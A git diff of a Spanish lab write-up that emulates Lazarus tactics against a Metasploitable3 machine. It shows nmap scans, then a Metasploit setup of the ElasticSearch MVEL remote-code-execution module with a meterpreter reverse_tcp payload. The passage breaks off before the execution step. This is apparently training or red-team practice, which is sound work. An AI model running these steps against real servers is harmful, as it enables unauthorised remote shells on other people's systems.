@@ -105,13 +105,76 @@ Basándome en el perfil de Lazarus construido con los datos del OpenCTI, identif
 Abre una terminal en tu Kali y ejecuta:
 
 ```
-# Escaneo para confirmar Metasploitable3
 nmap -sn 10.0.2.0/24
+```
 
-# Escaneo detallado del puerto 9200 (ElasticSearch)
+Con este comando confirmamos que MetasplOitable3
+
+![CONFIRMACION DE METASPLOITABLE3](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844042/CONFIRMACION_DE_METASPLOITABLE3_erz1jq.png)
+
+```
 nmap -p 9200 -sV 10.0.2.3
+```
 
-# Escaneo adicional para ver servicios abiertos en Metasploitable3
+Con este comando hacemos un escaneo detallado del puerto 9200 (ElasticSearch)
+
+![ESCANEO 9200](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844067/ESCANEO_9200_f34fxt.png)
+
+```
 nmap -p- --min-rate 1000 10.0.2.3
 ```
+
+Con este comando hacemos un escaneo adicional para ver los servicios abiertos en Metasploitable3
+
+![ESCANEO ADICIONAL](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844104/ESCANEO_ADICIONAL_qwa2f8.png)
+
+## Paso 2 -- Iniciar Metasploit y Configurar Exploit (T1190 - Exploit Public-Facing Application)
+
+* Iniciaremos el msfconsole
+
+```
+msfconsole
+```
+
+![MSFCONSOLE](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844831/MSFCONSOLE_ghr8xd.png)
+
+* Cargaremos el módulo de ElacticSearch
+
+```
+use exploit/multi/elasticsearch/script_mvel_rce
+```
+
+![ELASTICSEARCH](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844879/CARGA_DE_ELASTICSEARCH_xuz4z2.png)
+
+* Revisemos las opciones disponibles
+
+```
+show options
+```
+
+![SHOW OPTIONS](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786844912/SHOW_OPTIONS_qabw6d.png)
+
+* Ahora configuremos las opciones
+
+```
+set RHOSTS 10.0.2.3
+set RPORT 9200
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.2.15
+set LPORT 4444
+```
+
+![CONFIGURACION](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786845215/CONFIGURACION_wn5kw0.png)
+ 
+* Revisemos lo configurado
+
+```
+show options
+```
+
+![REVISION](https://res.cloudinary.com/dopcqb8wn/image/upload/v1786845306/REVISION_yvyiko.png)
+
+## Paso 3 — Ejecución del Exploit (T1190 - Exploit Public-Facing Application)
+
+Como tuvimos 
 
